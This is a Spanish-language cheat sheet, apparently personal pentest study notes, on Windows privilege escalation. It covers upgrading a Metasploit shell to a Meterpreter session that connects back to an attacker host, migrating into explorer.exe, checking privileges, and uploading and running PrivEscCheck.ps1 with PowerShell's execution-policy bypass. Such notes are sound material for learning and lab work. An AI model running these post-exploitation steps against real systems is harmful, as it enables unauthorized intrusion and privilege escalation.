# Windows – Privilege Escalation (con Meterpreter y PrivEscCheck)

---

## 1. Pasar de shell normal a Meterpreter
Si al principio tenemos una shell básica (cmd) en Metasploit, podemos mejorarla a Meterpreter:

```bash
use multi/manage/shell_to_meterpreter
set SESSION <ID>     # ID de la shell activa
set LHOST <IP atacante>
set LPORT <puerto>
exploit
```

Esto convierte la shell en una sesión **Meterpreter**, con todas sus funcionalidades.

---

## 2. Migración de proceso
Para estabilizar la sesión y evitar perderla:

```bash
ps                      # Ver procesos activos
pgrep explorer.exe      # Identificar PID de explorer.exe
migrate <PID>           # Migrar a proceso estable del usuario
```

- Migrar a `explorer.exe` es útil porque pertenece al usuario logueado y suele tener permisos elevados.

---

## 3. Verificación de permisos actuales
```bash
getuid      # Muestra el usuario actual
getprivs    # Lista los privilegios que tiene el proceso
```

- Aquí revisamos si tenemos privilegios interesantes (ej. `SeImpersonatePrivilege`, `SeDebugPrivilege`).

---

## 4. Subir **PrivEscCheck**
`PrivEscCheck.ps1` es un script de PowerShell para detectar rutas de escalada de privilegios.

### Subida al sistema:
```bash
upload /root/tools/PrivEscCheck.ps1 C:\\Temp\\PrivEscCheck.ps1
```

### Ejecución con bypass de políticas:
```bash
powershell -ep bypass
. C:\Temp\PrivEscCheck.ps1
Invoke-PrivEscCheck
```

---

## 5. ¿Qué hace PrivEscCheck?
- Revisa configuraciones del sistema en busca de **vulnerabilidades locales**.  
- Identifica **servicios mal configurados**, **archivos con permisos inseguros**, **UAC débil**, etc.  
- Da una lista de posibles vectores de escalada (ejemplo: credenciales guardadas, binarios con permisos de escritura, etc.).  

